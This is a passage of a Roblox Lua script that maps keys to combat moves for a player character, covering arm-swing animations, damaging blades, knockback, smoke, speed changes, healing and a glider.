				left.C1 = CFrame.new(1.35,.5,-.25)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*.25)) 
				wait(.2) 
				wait(.45) 
				right.C1 = CFrame.new(-1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.2)) 
				left.C1 = CFrame.new(1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*.2)) 
				wait() 
				right.C1 = CFrame.new(-1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.15)) 
				left.C1 = CFrame.new(1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*.15)) 
				wait() 
				right.C1 = CFrame.new(-1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.1)) 
				left.C1 = CFrame.new(1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*.1)) 
				wait() 
				right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.05)) 
				left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*.05)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
				left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
			end 
			if key == "f" then 
				local tar = mouse.Target 
				if tar.Parent:findFirstChild("Humanoid") ~= nil then 
					local float = Instance.new("BodyPosition") 
					float.Parent = tar.Parent.Torso 
					float.maxForce = Vector3.new(math.huge,math.huge,math.huge) 
					float.position = tar.Parent.Torso.Position + Vector3.new(0,10,0) 
					wait(1) 
					player.Humanoid.MaxHealth = 99999 
					player.Humanoid.Health = 99999 
					local floatme = Instance.new("BodyPosition") 
					floatme.Parent = player.Torso 
					floatme.maxForce = Vector3.new(math.huge,math.huge,math.huge) 
					floatme.position = tar.Parent.Torso.Position 
					wait(1) 
					right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
					left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
					wait() 
					right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.05)) 
					left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*.05)) 
					wait() 
					right.C1 = CFrame.new(-1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.1)) 
					left.C1 = CFrame.new(1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*.1)) 
					wait() 
					right.C1 = CFrame.new(-1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.15)) 
					left.C1 = CFrame.new(1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*.15)) 
					wait() 
					right.C1 = CFrame.new(-1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.2)) 
					left.C1 = CFrame.new(1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*.2)) 
					wait() 
					right.C1 = CFrame.new(-1.35,.5,-.25)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*-.25)) 
					left.C1 = CFrame.new(1.35,.5,-.25)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*.25)) 
					wait() 
					right.C1 = CFrame.new(-1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.2)) 
					left.C1 = CFrame.new(1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*.2)) 
					wait() 
					right.C1 = CFrame.new(-1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.15)) 
					left.C1 = CFrame.new(1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*.15)) 
					wait() 
					right.C1 = CFrame.new(-1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.1)) 
					left.C1 = CFrame.new(1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*.1)) 
					wait() 
					right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.05)) 
					left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*.05)) 
					wait() 
					right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
					left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
					wait() 
					right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
					left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
					wait() 
					right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.05)) 
					left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*.05)) 
					wait() 
					right.C1 = CFrame.new(-1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.1)) 
					left.C1 = CFrame.new(1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*.1)) 
					wait() 
					right.C1 = CFrame.new(-1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.15)) 
					left.C1 = CFrame.new(1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*.15)) 
					wait() 
					right.C1 = CFrame.new(-1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.2)) 
					left.C1 = CFrame.new(1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*.2)) 
					wait() 
					right.C1 = CFrame.new(-1.35,.5,-.25)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*-.25)) 
					left.C1 = CFrame.new(1.35,.5,-.25)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*.25)) 
					wait() 
					right.C1 = CFrame.new(-1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.2)) 
					left.C1 = CFrame.new(1.39,.4,-.2)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*.2)) 
					wait() 
					right.C1 = CFrame.new(-1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.15)) 
					left.C1 = CFrame.new(1.43,.3,-.15)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*.15)) 
					wait() 
					right.C1 = CFrame.new(-1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.1)) 
					left.C1 = CFrame.new(1.47,.2,-.1)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*.1)) 
					wait() 
					right.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.05)) 
					left.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*.05)) 
					wait() 
					right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
					left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
					wait(.5) 
					player.Humanoid.MaxHealth = 100 
					player.Humanoid.Health = 100 
					float:remove() 
					floatme:remove() 
				end 
			end 
			if key == "g" then 
				-- 
				rblade2 = Instance.new("Part") 
				rblade2.BrickColor = BrickColor.new("Really black") 
				rblade2.Parent = player 
				rblade2.CanCollide = false 
				rblade2.Size = Vector3.new(1,6,1) 
				rblade2.CFrame = rblade.CFrame 
				rblade2.formFactor = "Symmetric" 
				rblade2.TopSurface = 0 
				rblade2.BottomSurface = 0 
				rblade2.Reflectance = .5 
				rbm2 = Instance.new("BlockMesh") 
				rbm2.Parent = rblade2 
				rbm2.Scale = Vector3.new(.21,1,.31) 
				rbw2 = Instance.new("Weld") 
				rbw2.Parent = rblade 
				rbw2.Part0 = rblade 
				rbw2.Part1 = rblade2 
				lblade2 = Instance.new("Part") 
				lblade2.BrickColor = rblade.BrickColor 
				lblade2.Parent = player 
				lblade2.CanCollide = false 
				lblade2.Size = Vector3.new(1,6,1) 
				lblade2.CFrame = lblade.CFrame 
				lblade2.formFactor = "Symmetric" 
				lblade2.TopSurface = 0 
				lblade2.BottomSurface = 0 
				lblade2.Reflectance = .5 
				lbm2 = Instance.new("BlockMesh") 
				lbm2.Parent = lblade2 
				lbm2.Scale = Vector3.new(.21,1,.31) 
				lbw2 = Instance.new("Weld") 
				lbw2.Parent = lblade 
				lbw2.Part0 = lblade 
				lbw2.Part1 = lblade2 
				rblade.Touched:connect(function(hit) 
					if hit.Parent:findFirstChild("Humanoid") ~= nil then 
						if hit.Parent.Name ~= player.Name then 
							hit.Parent.Humanoid.Health = hit.Parent.Humanoid.Health - 10 
						end 
					end 
				end) 
				lblade.Touched:connect(function(hit) 
					if hit.Parent:findFirstChild("Humanoid") ~= nil then 
						if hit.Parent.Name ~= player.Name then 
							hit.Parent.Humanoid.Health = hit.Parent.Humanoid.Health - 10 
						end 
					end 
				end) 
				-- 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-1),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-1),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.9),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.9),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.8),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.8),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.7),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.7),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.6),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.6),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
				left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
				lblade2:remove() 
				rblade2:remove() 
			end 
			if key == "h" then 
				right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
				left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
				wait() 
				right.C1 = CFrame.new(-1.55,.0,0)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.0,0)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.44,.1,.1)*CFrame.Angles((math.pi*-.1),(math.pi*.1),(math.pi*-.2)) 
				left.C1 = CFrame.new(1.44,.1,.1)*CFrame.Angles((math.pi*-.1),(math.pi*.1),(math.pi*.2)) 
				wait() 
				right.C1 = CFrame.new(-1.33,.2,.2)*CFrame.Angles((math.pi*-.2),(math.pi*.2),(math.pi*-.15)) 
				left.C1 = CFrame.new(1.33,.2,.2)*CFrame.Angles((math.pi*-.2),(math.pi*.2),(math.pi*.15)) 
				wait() 
				right.C1 = CFrame.new(-1.22,-.3,.3)*CFrame.Angles((math.pi*-.3),(math.pi*.3),(math.pi*-.1)) 
				left.C1 = CFrame.new(1.22,-.3,.3)*CFrame.Angles((math.pi*-.3),(math.pi*.3),(math.pi*.1)) 
				wait() 
				right.C1 = CFrame.new(-1.11,-.4,.4)*CFrame.Angles((math.pi*-.4),(math.pi*.4),(math.pi*-.05)) 
				left.C1 = CFrame.new(1.11,-.4,.4)*CFrame.Angles((math.pi*-.4),(math.pi*.4),(math.pi*.05)) 
				wait() 
				right.C1 = CFrame.new(-1.00,-.5,.5)*CFrame.Angles((math.pi*-.5),(math.pi*-.5),(math.pi*-.00)) 
				left.C1 = CFrame.new(1.00,-.5,.5)*CFrame.Angles((math.pi*-.5),(math.pi*.5),(math.pi*.00)) 
				wait() 
				-- 
				rblade2 = Instance.new("Part") 
				rblade2.BrickColor = BrickColor.new("Really black") 
				rblade2.Parent = player 
				rblade2.CanCollide = false 
				rblade2.Size = Vector3.new(1,6,1) 
				rblade2.CFrame = rblade.CFrame 
				rblade2.formFactor = "Symmetric" 
				rblade2.TopSurface = 0 
				rblade2.BottomSurface = 0 
				rblade2.Reflectance = .5 
				rbm2 = Instance.new("BlockMesh") 
				rbm2.Parent = rblade2 
				rbm2.Scale = Vector3.new(.21,1,.31) 
				rbw2 = Instance.new("Weld") 
				rbw2.Parent = rblade 
				rbw2.Part0 = rblade 
				rbw2.Part1 = rblade2 
				lblade2 = Instance.new("Part") 
				lblade2.BrickColor = rblade.BrickColor 
				lblade2.Parent = player 
				lblade2.CanCollide = false 
				lblade2.Size = Vector3.new(1,6,1) 
				lblade2.CFrame = lblade.CFrame 
				lblade2.formFactor = "Symmetric" 
				lblade2.TopSurface = 0 
				lblade2.BottomSurface = 0 
				lblade2.Reflectance = .5 
				lbm2 = Instance.new("BlockMesh") 
				lbm2.Parent = lblade2 
				lbm2.Scale = Vector3.new(.21,1,.31) 
				lbw2 = Instance.new("Weld") 
				lbw2.Parent = lblade 
				lbw2.Part0 = lblade 
				lbw2.Part1 = lblade2 
				rblade.Touched:connect(function(hit) 
					if hit.Parent:findFirstChild("Humanoid") ~= nil then 
						if hit.Parent.Name ~= player.Name then 
							hit.Parent.Humanoid.Health = hit.Parent.Humanoid.Health - 10 
						end 
					end 
				end) 
				lblade.Touched:connect(function(hit) 
					if hit.Parent:findFirstChild("Humanoid") ~= nil then 
						if hit.Parent.Name ~= player.Name then 
							hit.Parent.Humanoid.Health = hit.Parent.Humanoid.Health - 10 
						end 
					end 
				end) 
				-- 
				for i = 1,40 do 
					wait() 
					lbw2.C1 = CFrame.new(0,0,0) * CFrame.Angles((math.pi*.1*i),0,0) 
					rbw2.C1 = CFrame.new(0,0,0) * CFrame.Angles((math.pi*.1*i),0,0) 
				end 
				right.C1 = CFrame.new(-1.11,-.4,.4)*CFrame.Angles((math.pi*-.4),(math.pi*.4),(math.pi*-.05)) 
				left.C1 = CFrame.new(1.11,-.4,.4)*CFrame.Angles((math.pi*-.4),(math.pi*.4),(math.pi*.05)) 
				wait() 
				right.C1 = CFrame.new(-1.22,-.3,.3)*CFrame.Angles((math.pi*-.3),(math.pi*.3),(math.pi*-.1)) 
				left.C1 = CFrame.new(1.22,-.3,.3)*CFrame.Angles((math.pi*-.3),(math.pi*.3),(math.pi*.1)) 
				wait() 
				right.C1 = CFrame.new(-1.33,.2,.2)*CFrame.Angles((math.pi*-.2),(math.pi*.2),(math.pi*-.15)) 
				left.C1 = CFrame.new(1.33,.2,.2)*CFrame.Angles((math.pi*-.2),(math.pi*.2),(math.pi*.15)) 
				wait() 
				right.C1 = CFrame.new(-1.44,.1,.1)*CFrame.Angles((math.pi*-.1),(math.pi*.1),(math.pi*-.2)) 
				left.C1 = CFrame.new(1.44,.1,.1)*CFrame.Angles((math.pi*-.1),(math.pi*.1),(math.pi*.2)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.0,0)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.0,0)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
				left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
				wait() 
				lblade2:remove() 
				rblade2:remove() 
			end 
			if key == "j" then 
				right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
				left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
				wait() 
				right.C1 = CFrame.new(-1.55,.0,0)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.0,0)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.44,.1,.1)*CFrame.Angles((math.pi*-.1),(math.pi*.1),(math.pi*-.2)) 
				left.C1 = CFrame.new(1.44,.1,.1)*CFrame.Angles((math.pi*-.1),(math.pi*.1),(math.pi*.2)) 
				wait() 
				right.C1 = CFrame.new(-1.33,.2,.2)*CFrame.Angles((math.pi*-.2),(math.pi*.2),(math.pi*-.15)) 
				left.C1 = CFrame.new(1.33,.2,.2)*CFrame.Angles((math.pi*-.2),(math.pi*.2),(math.pi*.15)) 
				wait() 
				right.C1 = CFrame.new(-1.22,-.3,.3)*CFrame.Angles((math.pi*-.3),(math.pi*.3),(math.pi*-.1)) 
				left.C1 = CFrame.new(1.22,-.3,.3)*CFrame.Angles((math.pi*-.3),(math.pi*.3),(math.pi*.1)) 
				wait() 
				right.C1 = CFrame.new(-1.11,-.4,.4)*CFrame.Angles((math.pi*-.4),(math.pi*.4),(math.pi*-.05)) 
				left.C1 = CFrame.new(1.11,-.4,.4)*CFrame.Angles((math.pi*-.4),(math.pi*.4),(math.pi*.05)) 
				wait() 
				right.C1 = CFrame.new(-1.00,-.5,.5)*CFrame.Angles((math.pi*-.5),(math.pi*-.5),(math.pi*-.00)) 
				left.C1 = CFrame.new(1.00,-.5,.5)*CFrame.Angles((math.pi*-.5),(math.pi*.5),(math.pi*.00)) 
				wait() 
				-- 
				rblade2 = Instance.new("Part") 
				rblade2.BrickColor = BrickColor.new("Really black") 
				rblade2.Parent = player 
				rblade2.CanCollide = false 
				rblade2.Size = Vector3.new(2,6,3) 
				rblade2.CFrame = rblade.CFrame 
				rblade2.formFactor = "Symmetric" 
				rblade2.TopSurface = 0 
				rblade2.BottomSurface = 0 
				rblade2.Reflectance = .5 
				rbm2 = Instance.new("BlockMesh") 
				rbm2.Parent = rblade2 
				rbm2.Scale = Vector3.new(.11,1,.11) 
				rbw2 = Instance.new("Weld") 
				rbw2.Parent = rblade 
				rbw2.Part0 = rblade 
				rbw2.Part1 = rblade2 
				lblade2 = Instance.new("Part") 
				lblade2.BrickColor = rblade.BrickColor 
				lblade2.Parent = player 
				lblade2.CanCollide = false 
				lblade2.Size = Vector3.new(2,6,3) 
				lblade2.CFrame = lblade.CFrame 
				lblade2.formFactor = "Symmetric" 
				lblade2.TopSurface = 0 
				lblade2.BottomSurface = 0 
				lblade2.Reflectance = .5 
				lbm2 = Instance.new("BlockMesh") 
				lbm2.Parent = lblade2 
				lbm2.Scale = Vector3.new(.11,1,.11) 
				lbw2 = Instance.new("Weld") 
				lbw2.Parent = lblade 
				lbw2.Part0 = lblade 
				lbw2.Part1 = lblade2 
				rblade2.Touched:connect(function(hit) 
					if hit.Parent:findFirstChild("Humanoid") ~= nil then 
						if hit.Parent.Name ~= player.Name then 
							hit.Parent.Humanoid.Sit = true 
							local a = hit.Parent:GetChildren() 
							for i = 1,#a do 
								wait() 
								if a.className == "Part" then 
									a.Velocity = CFrame.new(rblade2.Position, hit.Position).lookVector * 250 
								end 
							end 
						end 
					end 
				end) 
				lblade2.Touched:connect(function(hit) 
					if hit.Parent:findFirstChild("Humanoid") ~= nil then 
						if hit.Parent.Name ~= player.Name then 
							hit.Parent.Humanoid.Sit = true 
							local a = hit.Parent:GetChildren() 
							for i = 1,#a do 
								wait() 
								if a.className == "Part" then 
									a.Velocity = CFrame.new(lblade2.Position, hit.Position).lookVector * 250 
								end 
							end 
						end 
					end 
				end) 
				-- 
				for i = 1,40 do 
					wait() 
					lbw2.C1 = CFrame.new(0,0,0) * CFrame.Angles((math.pi*.1*i),0,0) 
					rbw2.C1 = CFrame.new(0,0,0) * CFrame.Angles((math.pi*.1*i),0,0) 
				end 
				right.C1 = CFrame.new(-1.11,-.4,.4)*CFrame.Angles((math.pi*-.4),(math.pi*.4),(math.pi*-.05)) 
				left.C1 = CFrame.new(1.11,-.4,.4)*CFrame.Angles((math.pi*-.4),(math.pi*.4),(math.pi*.05)) 
				wait() 
				right.C1 = CFrame.new(-1.22,-.3,.3)*CFrame.Angles((math.pi*-.3),(math.pi*.3),(math.pi*-.1)) 
				left.C1 = CFrame.new(1.22,-.3,.3)*CFrame.Angles((math.pi*-.3),(math.pi*.3),(math.pi*.1)) 
				wait() 
				right.C1 = CFrame.new(-1.33,.2,.2)*CFrame.Angles((math.pi*-.2),(math.pi*.2),(math.pi*-.15)) 
				left.C1 = CFrame.new(1.33,.2,.2)*CFrame.Angles((math.pi*-.2),(math.pi*.2),(math.pi*.15)) 
				wait() 
				right.C1 = CFrame.new(-1.44,.1,.1)*CFrame.Angles((math.pi*-.1),(math.pi*.1),(math.pi*-.2)) 
				left.C1 = CFrame.new(1.44,.1,.1)*CFrame.Angles((math.pi*-.1),(math.pi*.1),(math.pi*.2)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.0,0)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.0,0)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
				left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
				wait() 
				lblade2:remove() 
				rblade2:remove() 
			end 
			if key == "y" then 
				local blast = Instance.new("Part") 
				blast.formFactor = "Symmetric" 
				blast.Shape = "Ball" 
				blast.Size = Vector3.new(1,1,1) 
				blast.BrickColor = rblade.BrickColor 
				blast.Parent = Workspace 
				blast.CFrame = player.Torso.CFrame 
				game:GetService("Debris"):AddItem(blast, 15) 
				local smoke = Instance.new("Smoke") 
				smoke.Color = Color3.new(0,0,0) 
				smoke.Opacity = 1 
				smoke.RiseVelocity = 0 
				smoke.Size = 100 
				smoke.Parent = blast 
			end 
			if key == "u" then 
				local blast = Instance.new("Part") 
				blast.formFactor = "Symmetric" 
				blast.Shape = "Ball" 
				blast.Name = "keel" 
				blast.Size = Vector3.new(1,1,1) 
				blast.BrickColor = rblade.BrickColor 
				blast.Parent = Workspace 
				blast.CFrame = player.Torso.CFrame 
				game:GetService("Debris"):AddItem(blast, 15) 
				wait(2) 
				local smoke = Instance.new("Smoke") 
				smoke.Color = Color3.new(1,1,1) 
				smoke.Opacity = .5 
				smoke.RiseVelocity = 0 
				smoke.Size = 20 
				smoke.Parent = blast 
				coroutine.resume(coroutine.create(function() stun(blast) end)) 
			end 
			if key == "n" then 
				player.Humanoid.WalkSpeed = player.Humanoid.WalkSpeed + 8 
			end 
			if key == "m" then 
				player.Humanoid.WalkSpeed = player.Humanoid.WalkSpeed - 8 
			end 
			if key == ";" then 
				local l = player:findFirstChild("Left Arm") 
				local r = player:findFirstChild("Right Arm") 
				rblade.Size = Vector3.new(2, 6 , 2) 
				lblade.Size = Vector3.new(2, 6 , 2) 
				local w = Instance.new("Weld") 
				w.Part1 = rblade 
				w.Part0 = r 
				w.Parent = r 
				local w = Instance.new("Weld") 
				w.Part1 = lblade 
				w.Part0 = l 
				w.Parent = l 
			end 
			if key == "k" then 
				for i = 1,100 do 
					wait() 
					local p = Instance.new("Part") 
					p.BrickColor = BrickColor.new("Royal purple") 
					p.Name ="check" 
					p.Parent = Workspace 
					p.CanCollide = false 
					p.Size = Vector3.new(1,3,1) 
					p.CFrame = player.Torso.CFrame + Vector3.new(math.random(-5,5),math.random(-2,4),math.random(-5,5)) 
					p.formFactor = "Symmetric" 
					p.TopSurface = 0 
					p.BottomSurface = 0 
					p.Transparency = .5 
					local pm = Instance.new("SpecialMesh") 
					pm.Parent = p 
					pm.MeshType = "Sphere" 
					pm.Scale = Vector3.new(.2,.2,.2) 
					local pbv = Instance.new("BodyVelocity") 
					pbv.Parent = p 
					pbv.velocity = Vector3.new(0,10,0) 
					game:GetService("Debris"):AddItem(p, .2) 
					player.Humanoid.Health = player.Humanoid.Health +2 
				end 
			end 
			--glider? 
			if key == "p" then 
				-- 
				rblade2 = Instance.new("Part") 
				rblade2.BrickColor = BrickColor.new("Institutional white") 
				rblade2.Parent = player 
				rblade2.CanCollide = false 
				rblade2.Size = Vector3.new(1,6,1) 
				rblade2.CFrame = rblade.CFrame 
				rblade2.formFactor = "Symmetric" 
				rblade2.TopSurface = 0 
				rblade2.BottomSurface = 0 
				rblade2.Reflectance = 0 
				rbm2 = Instance.new("BlockMesh") 
				rbm2.Parent = rblade2 
				rbm2.Scale = Vector3.new(2,1,.31) 
				rbw2 = Instance.new("Weld") 
				rbw2.Parent = rblade 
				rbw2.Part0 = rblade 
				rbw2.Part1 = rblade2 
				lblade2 = Instance.new("Part") 
				lblade2.BrickColor = rblade.BrickColor 
				lblade2.Parent = player 
				lblade2.CanCollide = false 
				lblade2.Size = Vector3.new(1,6,1) 
				lblade2.CFrame = lblade.CFrame 
				lblade2.formFactor = "Symmetric" 
				lblade2.TopSurface = 0 
				lblade2.BottomSurface = 0 
				lblade2.Reflectance = 0 
				lbm2 = Instance.new("BlockMesh") 
				lbm2.Parent = lblade2 
				lbm2.Scale = Vector3.new(2,1,.31) 
				lbw2 = Instance.new("Weld") 
				lbw2.Parent = lblade 
				lbw2.Part0 = lblade 
				lbw2.Part1 = lblade2 
				local steer = Instance.new("Part") 
				steer.Transparency = 1 
				steer.Parent = player.Head 
				steerw= Instance.new("Weld") 
				steerw.Part0 = player.Head 
				steerw.Part1 = steer 
				steerw.Parent = player.Head 
				steerw.C1 = CFrame.new(0,0,0)*CFrame.Angles((math.pi*-.5),0,0) 
				-- 
				right.C1 = CFrame.new(-.55,.4,0)*CFrame.Angles(0,0,-.5) 
				left.C1 = CFrame.new(.55,.4,0)*CFrame.Angles(0,0,.5) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.6),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.6),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.7),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.7),(math.pi*0),(math.pi*.25)) 
				wait() 
